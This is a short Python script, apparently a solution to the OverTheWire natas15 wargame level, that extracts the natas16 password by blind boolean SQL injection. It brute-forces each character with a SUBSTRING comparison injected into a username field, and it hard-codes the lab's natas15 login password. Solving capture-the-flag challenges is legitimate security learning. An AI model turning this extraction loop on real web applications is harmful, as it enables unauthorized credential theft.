import requests
import string

# Credentials and URL
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = "http://natas15.natas.labs.overthewire.org"

# Possible characters in the password, consists of ascii upercase and loweracse letters and also didgits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

# An empty string to hold the extracted password
extracted_password = ""

# Length of the password is 32
password_length = 32

# Loop starting from 1 since SQL uses 1-based indexing and adding 1 so it is 32 characters long
for i in range(1, password_length + 1):
    # Goes through all the possible letters and digits to check if the character at position i in the password is equal to char
    for char in characters:
        # Chceks if the ith character of the password equals to the char
        # SUBSTRING is used to extract substring from the password sarting at position i. It extracts 1 character
        # BINARY is used to make the password case sensitive
        # -- is used to comment out all the rest of SQL query
        injection = f'natas16" AND BINARY SUBSTRING(password,{i},1)="{char}"-- '
        
        # First we authenticate using the natas15 username and password.
        # Then we post the extracted data 
        response = requests.post(url, auth=(username, password), data={"username": injection})
        
        # If the response contains 'This user exists', the character is correct, so we continue untill we get the password
        if "This user exists" in response.text:
            extracted_password += char
            print(f"Generating password: {extracted_password}")
            break

print(f"Final password for natas16: {extracted_password}")
